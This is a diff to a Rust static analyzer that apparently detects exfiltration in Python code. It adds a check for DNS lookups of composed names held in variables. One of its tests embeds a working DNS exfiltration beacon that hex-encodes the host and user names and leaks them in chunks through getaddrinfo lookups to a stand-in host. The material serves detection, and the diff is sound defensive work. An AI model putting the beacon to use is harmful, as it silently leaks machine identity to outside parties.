@@ -1003,6 +1003,32 @@ impl<'p> Analyzer<'p> {
         }
     }
 
+    /// A name given a composed value in the function or the module (`t =
+    /// f'{d}.x.com'` before `socket.getaddrinfo(t, 80)`).
+    fn sc_composed_name(&mut self, n: NodeId) -> bool {
+        if self.t().kind(n) != Kind::Name {
+            return false;
+        }
+        let name = self.t().str(a_(self.t(), n)).to_vec();
+        let fns = {
+            let mut v = vec![self.f];
+            let body_fn = self.p.mods[self.m as usize].body_fn;
+            if body_fn != self.f {
+                v.push(body_fn);
+            }
+            v
+        };
+        for f in fns {
+            let ix = self.sc_index(f);
+            if let Some(values) = ix.assigns.get(&name) {
+                if values.iter().any(|&v| self.sc_composed(v)) {
+                    return true;
+                }
+            }
+        }
+        false
+    }
+
     /// The constant text an interpreter's argument list holds as code: the
     /// item after an eval flag (`[sys.executable, '-c', code]`), if the
     /// list's first item is an interpreter.
@@ -1337,7 +1363,7 @@ impl<'p> Analyzer<'p> {
             let address = (spec.addresses < 0 || (spec.addresses > 0 && (i as i8) < spec.addresses)) && v.marks & OBJ_REQUEST == 0;
             if spec.composed {
                 match arg_nodes.get(i) {
-                    Some(&n) if self.sc_composed(n) => {}
+                    Some(&n) if self.sc_composed(n) || self.sc_composed_name(n) => {}
                     _ => continue,
                 }
             }
@@ -2675,6 +2701,15 @@ mod tests {
         assert_eq!(sent(&format!("{}class Beacon:\n    {}", head, post("socket.gethostname()"))), found("identity", "user or host name"));
         let src = format!("{}class B:\n    host = socket.gethostname()\n    def go(self):\n        {}B().go()\n", head, post("self.host"));
         assert_eq!(sent(&src), found("identity", "user or host name"));
+        // a DNS lookup of a composed name kept in a variable: the payload in
+        // chunks of hex, one lookup each (a dependency-confusion beacon)
+        let src = format!(
+            "import socket, getpass, json\ndata = json.dumps({{'h': socket.gethostname(), 'u': getpass.getuser()}})\nhex_str = data.encode().hex()\nparts = [hex_str[i * 60:(i + 1) * 60] for i in range(len(hex_str) // 60 + 1)]\nfor n, value in enumerate(parts):\n    name = f'v.{{n}}.{{value}}.{}'\n    socket.getaddrinfo(name, 80)\n",
+            HOST
+        );
+        assert_eq!(sent(&src), found("identity", "user or host name"));
+        // (the machine's own name looked up, kept in a variable: no send)
+        assert_eq!(sent("import socket\nh = socket.gethostname()\nsocket.gethostbyname(h)\n"), None);
         // (a container given nothing of the machine's stays clean)
         let src = format!("{}class C:\n    def __init__(self):\n        self.info = {{}}\n    def collect(self):\n        self.info['v'] = '1.0'\n    def send(self):\n        {}C().send()\n", head, post("self.info"));
         assert_eq!(sent(&src), None);
